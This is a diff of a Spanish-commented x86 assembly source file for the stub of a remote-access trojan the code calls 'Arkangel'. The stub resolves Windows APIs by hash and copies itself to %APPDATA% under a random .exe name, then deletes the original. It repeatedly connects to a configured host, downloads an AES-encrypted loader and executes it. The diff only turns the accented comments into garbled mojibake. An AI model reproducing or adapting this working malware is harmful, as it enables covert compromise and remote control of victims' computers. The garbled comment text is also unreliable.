@@ -1,9 +1,9 @@
-/*###############################################################################
-** Compilación condicionada:
-**    Dependiendo de las opciones aquí seleccionadas el código 
-**    resultante tendrá unas características u otras.
-**    Para más información sobre éstas revisar 'macros.h'.
-**    ¡¡¡EDITAR 'macros.h' PARA SELECCIONAR LA COMPILACIÓN CONDICIONADA!!!
+ï»¿/*###############################################################################
+** Compilaciï¿½n condicionada:
+**    Dependiendo de las opciones aquï¿½ seleccionadas el cï¿½digo 
+**    resultante tendrï¿½ unas caracterï¿½sticas u otras.
+**    Para mï¿½s informaciï¿½n sobre ï¿½stas revisar 'macros.h'.
+**    ï¿½ï¿½ï¿½EDITAR 'macros.h' PARA SELECCIONAR LA COMPILACIï¿½N CONDICIONADA!!!
 *###############################################################################*/
 #include "macros.h"
 INCLUDE_PYSRC(..\builder\intrabuilder.py)
@@ -16,7 +16,7 @@ INCLUDE_PYSRC(..\builder\intrabuilder.py)
 #define _EMIT_ARRAY(...) PYTHON_FUNCTION()
 
 //No queremos que muestre el warning de etiqueta sin referencia, 
-//ya que las usamos para mejorar la legibilidad del código
+//ya que las usamos para mejorar la legibilidad del cï¿½digo
 #pragma warning(disable:4102)
 //No queremos el warning de EMMS, sabemos que estamos haciendo.
 #pragma warning(disable:4799)
@@ -62,22 +62,22 @@ void LoadFunctions(DWORD numHashes);
 void __declspec(naked) main(){
     __asm{
         /*###############################################################################
-        ** Obtención del Delta offset:
-        **    Obtenemos la posición relativa de nuestro código.
-        **    Utilizamos un código poco común que utiliza la FPU.
+        ** Obtenciï¿½n del Delta offset:
+        **    Obtenemos la posiciï¿½n relativa de nuestro cï¿½digo.
+        **    Utilizamos un cï¿½digo poco comï¿½n que utiliza la FPU.
         **    Primero utilizamos 'fldXX' para actualizar el entorno de FPU
         **    rellenando el item 'FPUInstructionPointer' de la estructura
-        **    con la dirección de la última instrucción FPU
-        **    Por último cargamos la estructura de entorno con ('fstenv') 
+        **    con la direcciï¿½n de la ï¿½ltima instrucciï¿½n FPU
+        **    Por ï¿½ltimo cargamos la estructura de entorno con ('fstenv') 
         **    de tal forma que el item que necesitamos quede en esp y lo sacamos a edi.
         **    NOTAS{
-        **        1: Se harcodean los opcodes para evitar tanto la comprobación
-        **        de errores de FP como para evitar el byte superfluo que añade
+        **        1: Se harcodean los opcodes para evitar tanto la comprobaciï¿½n
+        **        de errores de FP como para evitar el byte superfluo que aï¿½ade
         **        el visualC
         **    }
         *###############################################################################*/
 find_delta:
-        /* Hay que cargar una constante que no genere ceros en la configuración
+        /* Hay que cargar una constante que no genere ceros en la configuraciï¿½n
         D9EB           FLDLN2       MM7-> B172 17F7 D1CF 79AC
         D9E9           FLDLG2       MM7-> 9A20 9A84 FBCF F799
         D9EA           FLDL2E       MM7-> B8AA 3B29 5C17 F0BC
@@ -103,11 +103,11 @@ find_delta:
 #pragma region constantes
         /*###############################################################################
         ** Constantes:
-        **    Aquí se declaran las constantes utilizadas en el código{
-        **        HASHES    : Hashes de las APIs de las que se obtendrá la dirección.
+        **    Aquï¿½ se declaran las constantes utilizadas en el cï¿½digo{
+        **        HASHES    : Hashes de las APIs de las que se obtendrï¿½ la direcciï¿½n.
         **        VARS      : Variables utilizadas.
         **        KEY       : Utilizado para identificar al cliente en el 'handshake'.
-        **        HOST      : Dónde se conectará el socket.
+        **        HOST      : Dï¿½nde se conectarï¿½ el socket.
         **    }
         *###############################################################################*/
 #pragma region hashes
@@ -175,11 +175,11 @@ over_hashes:
 copy_uni_to_ascii_filter:
 copy_next:
         lodsb                           //Cargamos byte
-        cmp  al, dl                     //¿Es el caracter que buscamos?
+        cmp  al, dl                     //ï¿½Es el caracter que buscamos?
         jz copy_done                    //Si lo es hemos acabado...
         stosb                           //Guardamos el byte
         inc esi                         //Saltamos el nulo
-        jmp copy_next                   //Siguiente carácter
+        jmp copy_next                   //Siguiente carï¿½cter
 copy_done:
         ret
         /*###############################################################################
@@ -200,14 +200,14 @@ load_next_target:
         bswap eax
 #endif
         shl  eax, 16                    //
-        test eax, eax                   //Comprobamos si es el último target
+        test eax, eax                   //Comprobamos si es el ï¿½ltimo target
         mov  al, AF_INET                //> Formateamos el puerto
         mov  [ebp+_PORT], eax           //Guardamos puerto
         mov  [ebp+_pHOST], esi          //Guardamos host
-        jnz  get_out                    //Si no es el último devolvemos
+        jnz  get_out                    //Si no es el ï¿½ltimo devolvemos
         mov  ecx, [ebp+_TARGETS]        //v
         dec  ecx                        //>ECX-- para forzar a leer el primer target
-        mov  [ebp+_pHOST], ecx          //> De ser el último apuntamos al inicio y devolvemos 0 en EAX
+        mov  [ebp+_pHOST], ecx          //> De ser el ï¿½ltimo apuntamos al inicio y devolvemos 0 en EAX
         xor  eax, eax
 get_out:
         ret
@@ -215,8 +215,8 @@ get_out:
 #ifdef ERR_CHECK
         /*###############################################################################
         ** gtfo:
-        **    Método para salir en cualquier momento de la ejecución sin mostrar ningún
-        **    error crítico, además es usado para tener una mejor idea de lo ocurrido
+        **    Mï¿½todo para salir en cualquier momento de la ejecuciï¿½n sin mostrar ningï¿½n
+        **    error crï¿½tico, ademï¿½s es usado para tener una mejor idea de lo ocurrido
         *###############################################################################*/
 gtfo:
         pop  edx
@@ -249,7 +249,7 @@ DoNotSkip:
         ret
 #endif //MELT
 over_fncs:
-        //Saltamos sobre la configuración
+        //Saltamos sobre la configuraciï¿½n
         jmp  to_start
     }
 
@@ -284,10 +284,10 @@ config_end:
     __asm{
 to_start:
         /*###############################################################################
-        ** Creación del stack de direcciones:
+        ** Creaciï¿½n del stack de direcciones:
         **    Lo primero que hacemos es reservar espacio en el stack para almacenar
-        **    las direcciones de APIs, también las variables.
-        **    Utilizaremos durante todo el código EBP como puntero al inicio de este
+        **    las direcciones de APIs, tambiï¿½n las variables.
+        **    Utilizaremos durante todo el cï¿½digo EBP como puntero al inicio de este
         **    'stack de direcciones'
         *###############################################################################*/
         add  esp, - STACKSIZE( )
@@ -298,18 +298,18 @@ to_start:
         /*###############################################################################
         ** Carga de APIs:
         **    Iniciamos el proceso de carga de APIs.
-        **    Primero se obtendrá el puntero a kernel32 después se cargarán sus funciones,
-        **    entre ellas LoadLibraryA(), con ésta se cargarán el resto de librerias.
+        **    Primero se obtendrï¿½ el puntero a kernel32 despuï¿½s se cargarï¿½n sus funciones,
+        **    entre ellas LoadLibraryA(), con ï¿½sta se cargarï¿½n el resto de librerias.
         *###############################################################################*/
         
-        //Obtenemos en eax la dirección de kernel32
+        //Obtenemos en eax la direcciï¿½n de kernel32
         push 0x30                       //v
         pop  esi                        //v
         lods DWORD PTR FS:[esi]         //>EAX = &(PEB)
         push [eax+0x0C]                 //Guardamos en el stack PEB->Ldr
         mov  eax, [eax+0x10]            //EAX = &RTL_USER_PROCESS_PARAMETERS
         /*###############################################################################
-        ** Obtención de %APPDATA%:
+        ** Obtenciï¿½n de %APPDATA%:
         ** Aprovechamos que hemos sacado el PEB para obtener kernel32 y
         ** recorremos el bloque de environments en busca de \0APPDATA=*
         *###############################################################################*/
@@ -352,7 +352,7 @@ find_kernel32_finished:
         //Cargamos las APIs de kernel32 en la pila a partir de los hashes
         DEBUG_MSG("sCK32", ["kernel32_count"])
         DEBUG_MSG("sADDR", ["eax"])
-        push kernel32_count             //v Número de hashes de kernel32
+        push kernel32_count             //v Nï¿½mero de hashes de kernel32
         call edi                        //>LoadFunctions(kernel32_count);
         mov  ebx, [ebp-(kernel32_count*4)+_LoadLibraryA+STACK_OFFSET]//EBX = &LoadLibraryA
         DEBUG_MSG("sOK")
@@ -368,7 +368,7 @@ find_kernel32_finished:
         pop  edx                        //>Restauramos la pila sacando la cadena ANSI
         
         //Cargamos las APIs de ws2_32 en la pila a partir de los hashes
-        push ws2_32_count               //v Número de hashes de ws2_32
+        push ws2_32_count               //v Nï¿½mero de hashes de ws2_32
         call edi                        //>LoadFunctions(ws2_32_count);
         DEBUG_MSG("sOK")
         //Obtenemos el BaseAddress de advapi32
@@ -382,26 +382,26 @@ find_kernel32_finished:
         DEBUG_MSG("sADDR", ["eax"])
         add  esp, 0xC                   //Restauramos la pila eliminando la cadena ANSI
 
-        push advapi32_count             //v Número de hashes de advapi32
+        push advapi32_count             //v Nï¿½mero de hashes de advapi32
         call edi                        //>LoadFunctions(advapi32_count);
         DEBUG_MSG("sOK")
-        add  esp, 0xC                   //Reparamos el stack después de las llamadas a LoadFunctions()
+        add  esp, 0xC                   //Reparamos el stack despuï¿½s de las llamadas a LoadFunctions()
 #ifdef SC_DELTA
         pop  edi                        //Recuperamos el Delta
 #endif //SC_DELTA
         //Volvemos a apuntar al inicio del stack de APIs
         sub  ebp, (kernel32_count+ws2_32_count+advapi32_count)*4 - STACK_OFFSET
 
-        //Creamos un buffer para almacenar la configuración cifrada y luego descifrarla.
-        movr(esi, config_start)         //Cargamos la posición del inicio de la config
+        //Creamos un buffer para almacenar la configuraciï¿½n cifrada y luego descifrarla.
+        movr(esi, config_start)         //Cargamos la posiciï¿½n del inicio de la config
 
         /*###############################################################################
         **        TRAS ESTE PUNTO YA NO NECESITAMOS ALMACENAR EL DELTA (EDI)
         *###############################################################################*/
 
         /*###############################################################################
-        ** Descifrado y almacenado de la configuración:
-        **   - Se descifra la configuración usando un packet XOR
+        ** Descifrado y almacenado de la configuraciï¿½n:
+        **   - Se descifra la configuraciï¿½n usando un packet XOR
         *###############################################################################*/
         call CreateBuff                 //>CreateBuff();
 
@@ -436,7 +436,7 @@ repeat: inc  esi
         mov  [ebp+_TARGETS], esi        //
 
         /*###############################################################################
-        **                          Comprobación del Mutex
+        **                          Comprobaciï¿½n del Mutex
         *###############################################################################*/
         DEBUG_MSG("sMTX", ["[ebp+_pMUTEX]"])
         cdq                             //EDX = 0
@@ -462,7 +462,7 @@ nomtx:
         /*###############################################################################
         ** Realizamos el Melt:
         **   - Primero nos copiamos a %APPDATA%\XXXX.exe
-        **   - Después ejecutamos la copia pasándole de parámetro nuestra ruta.
+        **   - Despuï¿½s ejecutamos la copia pasï¿½ndole de parï¿½metro nuestra ruta.
         **
         **   - La copia se encarga de eliminarnos.
         *###############################################################################*/
@@ -499,18 +499,18 @@ next_char:
         call copy_uni_to_ascii_filter   //>Y pasamos de UNICODE a ASCII hasta encontrar un \0
 
         //Por ahora &_APPDATA = >>"%APPDATA%<<
-        //Añadimos a %APPDATA% un nombre al azar.
+        //Aï¿½adimos a %APPDATA% un nombre al azar.
         cdq                             //EDX = 0
         push edi                        //v
         push edx                        //v
         push edx                        //v
         push edi                        //v
         call [ebp+_GetTempFileNameA]    //>GetTempFileNameA(Buff, NULL, 0, Buff);
-        mov  DWORD PTR[edi+5], 'exe.'   //Reemplazamos la extensión a ".exe"
+        mov  DWORD PTR[edi+5], 'exe.'   //Reemplazamos la extensiï¿½n a ".exe"
         
         //Ahora &_APPDATA = >>"%APPDATA%\XXXX.exe\0<<
         pop  esi                        //Recuperamos el puntero a &CommandLine
-        lea  edi, [edi+11]              //Saltamos el \0\0 que luego será comilla de cierre y espacio
+        lea  edi, [edi+11]              //Saltamos el \0\0 que luego serï¿½ comilla de cierre y espacio
         push edi                        //Guardamos el puntero para luego
 
         mov  dl, '"'                    //v
@@ -526,12 +526,12 @@ next_char:
         call [ebp+_CopyFileA]           //>CopyFileA(&MyPath, &APPDATA, false);
 
         dec  edi                        //v
-        dec  edi                        //>Volvemos a \0\0 que se transformará a >>" <<
+        dec  edi                        //>Volvemos a \0\0 que se transformarï¿½ a >>" <<
         mov  ax, ' "'                   //v
         stosw                           //>Metemos las comillas y el espacio
 
         //&_APPDATA = >>"%APPDATA%\XXXX.exe" %MyPath%<<
-        //Ejecutamos nuestra copia pasándole nuestra ruta
+        //Ejecutamos nuestra copia pasï¿½ndole nuestra ruta
         push 1                          //V
         push [ebp+_APPDATA]             //v
         call [ebp+_WinExec]             //>WinExec(&_APPDATA, SW_SHOWNORMAL);
@@ -543,7 +543,7 @@ do_not_copy://(Somos la copia)
         //Vamos a finalizar el Melt eliminando el fichero que se nos pasa
         pop  esi                        //Recuperamos el inicio &CommandLine (=LIMPIAR STACK)
         //EDI = Puntero a nuestro nombre de ejecutable
-        mov  cl, 0x7F                   //TAMAÑO MÁXIMO PARA NUESTRO NOMBRE + EXT
+        mov  cl, 0x7F                   //TAMAï¿½O Mï¿½XIMO PARA NUESTRO NOMBRE + EXT
         xor  eax, eax                   //v
         mov  al, '"'                    //> EAX = '"'
         repne scasw                     //>Buscamos en EDI la comilla
@@ -577,7 +577,7 @@ found:
         mov  edi, edx
         mov  dl, '"'
         call copy_uni_to_ascii_filter
-        mov  DWORD PTR[edi-4], 'tad.'   //Cambiamos la extensión a .dat
+        mov  DWORD PTR[edi-4], 'tad.'   //Cambiamos la extensiï¿½n a .dat
 
         DEBUG_MSG("sOFFLINE", ["edi"])
 
@@ -604,10 +604,10 @@ _cont:  xor  eax, eax                   //EAX = 0
         mov  [ebp+_pBuff], eax          //pBuffer = EAX
 
         /*###############################################################################
-        ** Creación del socket:
-        **    Una vez cargadas todas las APIs que necesitaremos de las distintas librerías
-        **    creamos el socket para conectarnos al cliente e iniciar la autentificación.
-        **    Otra vez más utilizamos el stack para evitar crear buffers innecesarios.
+        ** Creaciï¿½n del socket:
+        **    Una vez cargadas todas las APIs que necesitaremos de las distintas librerï¿½as
+        **    creamos el socket para conectarnos al cliente e iniciar la autentificaciï¿½n.
+        **    Otra vez mï¿½s utilizamos el stack para evitar crear buffers innecesarios.
         *###############################################################################*/
 
         //Iniciamos el socket
@@ -623,7 +623,7 @@ _cont:  xor  eax, eax                   //EAX = 0
         push 0x202                      //v VersionRequested = 2.2
 #endif //SC_NULL
         call [ebp+_WSAStartup]          //>WSAStartup(0x202, &WSADATA);
-        add  esp, ebx                   //Restauramos la pila eliminando WSADATA de ésta
+        add  esp, ebx                   //Restauramos la pila eliminando WSADATA de ï¿½sta
 
 newSocket:
         //Creamos el socket AF_INET y SOCK_STREAM
@@ -680,12 +680,12 @@ do_the_loop:
         call [ebp+_Sleep]               //Sleep(0x3F8);
 connect_loop:
         DEBUG_MSG("sCON", ["[ebp+_pHOST]"])
-        //Obtenemos la dirección válida
+        //Obtenemos la direcciï¿½n vï¿½lida
         push [ebp+_pHOST]               //v
         call [ebp+_gethostbyname]       //>gethostbyname(&HOST);
         
         test eax, eax                   //v
-        jz  sleep_and_loop              //> Si ha habido algún error obteniendo el HOST repetimos
+        jz  sleep_and_loop              //> Si ha habido algï¿½n error obteniendo el HOST repetimos
 
         add  eax, 0x20                  //EAX = hostent.h_name
         push eax                        //v
@@ -707,14 +707,14 @@ connect_loop:
 connected:
         DEBUG_MSG("sOK")
         /*###############################################################################
-        ** Recepción de datos desde el cliente:
-        **  Una vez establecida la conexión con éxito intentamos recibir 
+        ** Recepciï¿½n de datos desde el cliente:
+        **  Una vez establecida la conexiï¿½n con ï¿½xito intentamos recibir 
         **  el paquete inicial compuesto de:
         **      IV+checksum+LOADER_IAT+CARGADOR
         **  Siendo cada uno:
-        **      *IV(16bytes)    : Vector de inicialización para el cifrado
+        **      *IV(16bytes)    : Vector de inicializaciï¿½n para el cifrado
         **{{
-        **      *checksum       : checksum de todo el payload, para evitar error crítico al ejecutar.
+        **      *checksum       : checksum de todo el payload, para evitar error crï¿½tico al ejecutar.
         **      *LOADER     : Loader de Arkangel encargado de descargar, ubicar y ejecutar el cargador de plugins.
         **}}
         **  Lo envuelto entre {{*}} viene cifrado en AES-128-cbc usando como clave el hash SHA1(pass)
@@ -744,10 +744,10 @@ KillSocket:
         jmp  newSocket                  //Creamos un nuevo socket
 
         /*###############################################################################
-        ** Descifrado y autentificación:
+        ** Descifrado y autentificaciï¿½n:
         **    Una vez obtenidos los datos comprobamos que el emisor ha sido el cliente.
         **    Para esto los desciframos con la clave compartida que tenemos (SHA1(user+pass))
-        **    Luego, para evitar ejecutar código erróneo comprobamos el checksum
+        **    Luego, para evitar ejecutar cï¿½digo errï¿½neo comprobamos el checksum
         *###############################################################################*/
 
 init_decrypt:
@@ -771,7 +771,7 @@ init_decrypt:
         //Importamos la clave
         cdq                             //EDX = 0
         push ebp                        //v
-        add  DWORD PTR[esp], _hKey      //v Dirección a la variable que contendrá el Handler a la key
+        add  DWORD PTR[esp], _hKey      //v Direcciï¿½n a la variable que contendrï¿½ el Handler a la key
         push edx                        //v
         push edx                        //v
         push 0x1C                       //v sizeof(aes128Blob)
@@ -792,13 +792,13 @@ init_decrypt:
         push [ebp+_buffLen]             //Guardamos SizeOfPayLoad+4
 
         //Finalmente desciframos los datos obtenidos
-        //Los datos se encuentran en el paquete así: IV(16Bytes)+DataEncrypt
+        //Los datos se encuentran en el paquete asï¿½: IV(16Bytes)+DataEncrypt
 
         cdq                             //EDX = 0
 
         mov  esi, [ebp+_pBuff]          //ESI = pBuff = &IV
         add  esi, 16                    //ESI = &Checksum
-        push [ebp+_buffLen]             //Variable temporal para guardar el tamaño de los datos a leer
+        push [ebp+_buffLen]             //Variable temporal para guardar el tamaï¿½o de los datos a leer
 
         push esp                        //v
         push esi                        //v
@@ -816,11 +816,11 @@ init_decrypt:
         jz   KillSocket                 //(EAX==0)? Si EAX es cero es que no se ha descifrado correctamente.
                                         // Posiblemente la cantidad recibida no sea multiple de 16
         /*###############################################################################
-        ** Comprobación del checksum:
+        ** Comprobaciï¿½n del checksum:
         **    El checksum esta en +16 de los datos recibidos.
         **    El algoritmo utilizado para calcular el checksum es:
         **        *FNV1a (http://goo.gl/1A7ir)
-        **    (Elegido por una buena relación tamaño-calidad)
+        **    (Elegido por una buena relaciï¿½n tamaï¿½o-calidad)
         *###############################################################################*/
 
         sub  ecx, 4                     //ECX = SizePayload
@@ -849,16 +849,16 @@ FNV1a:
         DEBUG_MSG("sEJEC", ["eax"])
         call eax                        //>loader(&LoadLibraryA, hSocket, &KEY);
 
-        //En caso de que haya habido algún error no crítico el loader me devuelve la ejecución
+        //En caso de que haya habido algï¿½n error no crï¿½tico el loader me devuelve la ejecuciï¿½n
         jmp KillSocket                  //Reiniciamos el bucle de espera
     }
 }
 
 /*###############################################################################
 ** LoadFunctions:
-**  Método encargado de rellenar el stack de direcciones.
-**  Llama a la función FindFunction() por cada hash en la lista
-**  almacenando la dirección en su respectiva posición del stack.
+**  Mï¿½todo encargado de rellenar el stack de direcciones.
+**  Llama a la funciï¿½n FindFunction() por cada hash en la lista
+**  almacenando la direcciï¿½n en su respectiva posiciï¿½n del stack.
 **  RECIBE BASEADDRESS EN EAX y el puntero a HASHES en ESI
 *###############################################################################*/
 void __declspec(naked) LoadFunctions(DWORD numHashes){
@@ -875,9 +875,9 @@ nextFunction:
 #pragma region FindFunction
 /*###############################################################################
 ** FindFunction:
-**    Función que recorre la EAT de una DLL en busca de cierta función.
-**    Para ello genera un hash del nombre de la función y lo compara con el recibido.
-**    Para más información revisar 'macros.h'
+**    Funciï¿½n que recorre la EAT de una DLL en busca de cierta funciï¿½n.
+**    Para ello genera un hash del nombre de la funciï¿½n y lo compara con el recibido.
+**    Para mï¿½s informaciï¿½n revisar 'macros.h'
 *###############################################################################*/
 find_function:
         pushad
@@ -936,7 +936,7 @@ find_function_finished:
         popad
 #pragma endregion AX=HASH;EDX=BaseAddr
 
-        //Guardamos dirección en buffer pila
+        //Guardamos direcciï¿½n en buffer pila
         stosd
         loop nextFunction               //(ECX--);(ECX!=0)?
         mov  ebp, edi
